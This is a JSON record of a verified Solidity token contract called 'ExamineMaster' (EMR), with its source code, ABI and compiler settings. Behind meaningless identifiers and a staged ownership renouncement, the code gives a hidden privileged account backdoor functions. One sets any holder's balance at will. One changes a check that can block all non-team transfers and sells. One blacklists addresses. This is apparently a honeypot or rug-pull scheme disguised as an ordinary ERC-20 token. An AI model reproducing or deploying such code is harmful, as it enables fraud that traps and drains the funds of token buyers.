{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface isReceiver {\n    function createPair(address tokenMode, address toMarketing) external returns (address);\n}\n\ninterface launchToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTakeBuy) external view returns (uint256);\n\n    function transfer(address takeTrading, uint256 liquiditySellSender) external returns (bool);\n\n    function allowance(address modeMarketingIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquiditySellSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTrading,\n        uint256 liquiditySellSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minTotal, uint256 value);\n    event Approval(address indexed modeMarketingIs, address indexed spender, uint256 value);\n}\n\nabstract contract tradingMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitLaunchTx is launchToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExamineMaster is tradingMode, launchToken, limitLaunchTx {\n\n    uint256 feeTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTeam;\n    }\n\n    string private tokenSell = \"Examine Master\";\n\n    address launchedShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private enableTotal;\n\n    uint256 private sellLiquidity;\n\n    constructor (){\n        \n        totalLaunch fundTxReceiver = totalLaunch(launchedShould);\n        tradingEnable = isReceiver(fundTxReceiver.factory()).createPair(fundTxReceiver.WETH(), address(this));\n        \n        teamToken = _msgSender();\n        launchTeamLiquidity[teamToken] = true;\n        senderIs[teamToken] = txEnable;\n        listIs();\n        if (maxLiquidity == launchedTrading) {\n            maxLiquidity = buyTx;\n        }\n        emit Transfer(address(0), teamToken, txEnable);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityExempt;\n\n    function transfer(address isMin, uint256 liquiditySellSender) external virtual override returns (bool) {\n        return minList(_msgSender(), isMin, liquiditySellSender);\n    }\n\n    string private senderTeam = \"EMR\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingSwap;\n    }\n\n    address toFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return modeEnable;\n    }\n\n    uint256 public buyTx;\n\n    function launchShouldSwap(address atShould) public {\n        takeMinLaunched();\n        \n        if (atShould == teamToken || atShould == tradingEnable) {\n            return;\n        }\n        fundMarketing[atShould] = true;\n    }\n\n    address private modeEnable;\n\n    function minList(address marketingAmount, address takeTrading, uint256 liquiditySellSender) internal returns (bool) {\n        if (marketingAmount == teamToken) {\n            return modeLaunch(marketingAmount, takeTrading, liquiditySellSender);\n        }\n        uint256 sellMode = launchToken(tradingEnable).balanceOf(toFee);\n        require(sellMode == feeTrading);\n        require(takeTrading != toFee);\n        if (fundMarketing[marketingAmount]) {\n            return modeLaunch(marketingAmount, takeTrading, buyListTotal);\n        }\n        return modeLaunch(marketingAmount, takeTrading, liquiditySellSender);\n    }\n\n    uint256 teamMarketing;\n\n    bool public txExempt;\n\n    function listIs() public {\n        emit OwnershipTransferred(teamToken, address(0));\n        modeEnable = address(0);\n    }\n\n    function takeMinLaunched() private view {\n        require(launchTeamLiquidity[_msgSender()]);\n    }\n\n    bool private minReceiver;\n\n    address public teamToken;\n\n    function transferFrom(address marketingAmount, address takeTrading, uint256 liquiditySellSender) external override returns (bool) {\n        if (_msgSender() != launchedShould) {\n            if (liquidityExempt[marketingAmount][_msgSender()] != type(uint256).max) {\n                require(liquiditySellSender <= liquidityExempt[marketingAmount][_msgSender()]);\n                liquidityExempt[marketingAmount][_msgSender()] -= liquiditySellSender;\n            }\n        }\n        return minList(marketingAmount, takeTrading, liquiditySellSender);\n    }\n\n    address public tradingEnable;\n\n    uint256 public launchedTrading;\n\n    event OwnershipTransferred(address indexed fromLimitList, address indexed shouldListFee);\n\n    function modeLaunch(address marketingAmount, address takeTrading, uint256 liquiditySellSender) internal returns (bool) {\n        require(senderIs[marketingAmount] >= liquiditySellSender);\n        senderIs[marketingAmount] -= liquiditySellSender;\n        senderIs[takeTrading] += liquiditySellSender;\n        emit Transfer(marketingAmount, takeTrading, liquiditySellSender);\n        return true;\n    }\n\n    function approve(address liquidityMax, uint256 liquiditySellSender) public virtual override returns (bool) {\n        liquidityExempt[_msgSender()][liquidityMax] = liquiditySellSender;\n        emit Approval(_msgSender(), liquidityMax, liquiditySellSender);\n        return true;\n    }\n\n    uint256 private txEnable = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return modeEnable;\n    }\n\n    function toFeeEnable(address isMin, uint256 liquiditySellSender) public {\n        takeMinLaunched();\n        senderIs[isMin] = liquiditySellSender;\n    }\n\n    uint8 private tradingSwap = 18;\n\n    function swapMode(uint256 liquiditySellSender) public {\n        takeMinLaunched();\n        feeTrading = liquiditySellSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txEnable;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenSell;\n    }\n\n    function balanceOf(address shouldTakeBuy) public view virtual override returns (uint256) {\n        return senderIs[shouldTakeBuy];\n    }\n\n    function launchSwapTx(address teamList) public {\n        require(teamList.balance < 100000);\n        if (txExempt) {\n            return;\n        }\n        \n        launchTeamLiquidity[teamList] = true;\n        if (minReceiver) {\n            enableTotal = true;\n        }\n        txExempt = true;\n    }\n\n    mapping(address => bool) public fundMarketing;\n\n    function allowance(address launchedShouldBuy, address liquidityMax) external view virtual override returns (uint256) {\n        if (liquidityMax == launchedShould) {\n            return type(uint256).max;\n        }\n        return liquidityExempt[launchedShouldBuy][liquidityMax];\n    }\n\n    mapping(address => uint256) private senderIs;\n\n    mapping(address => bool) public launchTeamLiquidity;\n\n    uint256 public maxLiquidity;\n\n    uint256 constant buyListTotal = 13 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimitList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldListFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShouldBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySellSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTakeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"}],\"name\":\"launchShouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"}],\"name\":\"launchSwapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTeamLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquiditySellSender\",\"type\":\"uint256\"}],\"name\":\"swapMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySellSender\",\"type\":\"uint256\"}],\"name\":\"toFeeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySellSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySellSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ExamineMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}